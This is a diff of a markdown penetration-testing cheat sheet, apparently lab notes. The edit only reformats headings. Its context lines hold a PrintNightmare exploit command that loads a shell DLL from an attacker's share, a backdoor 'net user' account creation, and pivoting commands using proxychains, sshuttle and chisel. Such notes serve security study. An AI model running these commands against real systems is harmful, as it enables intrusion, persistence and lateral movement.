@@ -193,7 +193,7 @@ python3 CVE-2021-1675.py <DC>/<user>:<Password>@<DC IP> '\\<LHOST>\share\shell.d
    - Net user badboy password123 /add
 
 # Pivoting
-- #### Using Proxychains
+#### Using Proxychains
 ```powershell
 ssh -f -N -D 9050 -i pivot root@x.x.x.x
 
@@ -206,12 +206,12 @@ ssh -f -N -D 9050 -i pivot root@x.x.x.x
 ```bash
 proxychains nmap x.x.x.x -sT
 ```
-- #### using sshuttle
+#### using sshuttle
 ```bash
 sshuttle -r root@10.10.10.33 10.10.10.0/24 --ssh-cmd "ssh -i pivot"
 ```
 Now we can run commands directly without using proxychains in front of commands.
-- #### Using chisel
+#### Using chisel
 - On the local machine:
 ```bash
 ./chisel server -p 8000 --reverse
